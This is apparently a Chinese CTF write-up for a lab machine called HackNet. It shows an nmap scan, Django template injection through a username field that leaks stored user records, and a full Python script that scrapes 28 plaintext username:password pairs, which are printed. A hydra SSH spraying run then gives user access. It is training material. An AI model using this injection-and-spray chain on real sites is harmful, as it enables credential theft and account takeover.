
## 扫描
```SHELL
$ nmap -Pn -A 10.10.11.85
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 03:15 EDT
Nmap scan report for 10.10.11.85
Host is up (2.2s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp   open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   595.89 ms 10.10.16.1
2   631.20 ms 10.10.11.85

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.58 seconds

```

## web
![](attachments/Pasted%20image%2020250922152328.png)

ssti无法执行命令和python 利用修改用户名为变量渲染在点赞一个post后可以对自己的名字进行渲染

![](attachments/Pasted%20image%2020250922161949.png)

`{{ users.values }}`
![](attachments/Pasted%20image%2020250922162224.png)

```PYTHON
import re
import requests
import html
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

url = "http://hacknet.htb"

# 使用 Session 并配置重试策略
session = requests.Session()
retry_strategy = Retry(
    total=3,
    backoff_factor=0.5,
    status_forcelist=[429, 500, 502, 503, 504],
)
adapter = HTTPAdapter(max_retries=retry_strategy)
session.mount("http://", adapter)
session.mount("https://", adapter)

# 设置请求头
session.headers.update({
    'Cookie': "csrftoken=teFhurYRQbU2iIi7iN7Ev6Ssug9d70ne; sessionid=wbtwimsmuijwrnycxbvppp5l0zo79np6",
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'  # 可选的 User-Agent
})

all_users = set()

for i in range(1, 31):  # 假设帖子ID从1到30
    try:
        # 1. 点赞帖子
        like_response = session.get(f"{url}/like/{i}", timeout=10)
        like_response.raise_for_status()  # 如果状态码不是200，抛出异常

        # 短暂延迟，避免请求过快
        time.sleep(0.5)

        # 2. 获取点赞列表
        likes_response = session.get(f"{url}/likes/{i}", timeout=10)
        likes_response.raise_for_status()
        text = likes_response.text

        # 3. 解析HTML，尝试提取title
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)
        if not img_titles:
            print(f"[-] 帖子 {i} 的响应中未找到img title属性")
            continue

        last_title = html.unescape(img_titles[-1])  # 取最后一个title

        # 4. 检查是否包含目标数据
        if "<QuerySet" not in last_title:
            # 数据未出现，重试点赞并重新获取
            print(f"[*] 帖子 {i} 初次未发现QuerySet数据，尝试重试点赞...")
            session.get(f"{url}/like/{i}", timeout=10)
            time.sleep(0.5)
            likes_response_retry = session.get(f"{url}/likes/{i}", timeout=10)
            likes_response_retry.raise_for_status()
            text_retry = likes_response_retry.text
            img_titles_retry = re.findall(r'<img [^>]*title="([^"]*)"', text_retry)
            if img_titles_retry:
                last_title = html.unescape(img_titles_retry[-1])
            else:
                print(f"[-] 帖子 {i} 重试后仍未找到img title")
                continue

        # 5. 提取邮箱和密码
        emails = re.findall(r"'email': '([^']*)'", last_title)
        passwords = re.findall(r"'password': '([^']*)'", last_title)

        if not emails or not passwords:
            print(f"[-] 帖子 {i} 的title中未提取到邮箱或密码")
            continue

        if len(emails) != len(passwords):
            print(f"[!] 帖子 {i} 提取的邮箱数和密码数不一致: emails={emails}, passwords={passwords}")
            # 选择最小长度进行配对，避免索引错误
            min_len = min(len(emails), len(passwords))
            emails = emails[:min_len]
            passwords = passwords[:min_len]

        # 6. 组合用户名密码
        for email, pwd in zip(emails, passwords):
            username = email.split('@')[0]
            credential = f"{username}:{pwd}"
            all_users.add(credential)
            print(f"[+] 从帖子 {i} 成功提取: {credential}")

    except requests.exceptions.RequestException as e:
        print(f"[-] 处理帖子 {i} 时发生网络错误: {e}")
    except Exception as e:
        print(f"[-] 处理帖子 {i} 时发生未知错误: {e}")

    # 每个帖子处理完后稍作休息
    time.sleep(0.5)

# 7. 输出所有收集到的凭证
print("\n[+] 去重后的用户名:密码对:")
for user in all_users:
    print(user)

# 可选：保存到文件
with open('credentials.txt', 'w') as f:
    for cred in all_users:
        f.write(cred + '\n')
print("[+] 凭证已保存到 credentials.txt")
```

```
bytebandit:Byt3B@nd!t123
glitch:Gl1tchH@ckz
cryptoraven:CrYptoR@ven42
darkseeker:D@rkSeek3r#
codebreaker:C0d3Br3@k!
brute_force:BrUt3F0rc3#
netninja:N3tN1nj@2024
rootbreaker:R00tBr3@ker#
trojanhorse:Tr0j@nH0rse!
deepdive:D33pD!v3r
mikey:mYd4rks1dEisH3re
wum0nster:123456
exploit_wizard:Expl01tW!zard
cyberghost:Gh0stH@cker2024
shadowwalker:Sh@dowW@lk2024
jo:jojo1234
virus_viper:V!rusV!p3r2024
hexhunter:H3xHunt3r!
datadive:D@taD1v3r
zero_day:Zer0D@yH@ck
shadowmancer:Sh@d0wM@ncer
phreaker:Phre@k3rH@ck
kali:kali
packetpirate:P@ck3tP!rat3
whitehat:Wh!t3H@t2024
shadowcaster:Sh@d0wC@st!
stealth_hawk:St3@lthH@wk
blackhat_wolf:Bl@ckW0lfH@ck
```


## user.txt
```SHELL
$ hydra -C credentials.txt hacknet.htb ssh -I          
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-22 05:17:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries, ~2 tries per task
[DATA] attacking ssh://hacknet.htb:22/
[22][ssh] host: hacknet.htb   login: mikey   password: mYd4rks1dEisH3re
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-22 05:18:10
```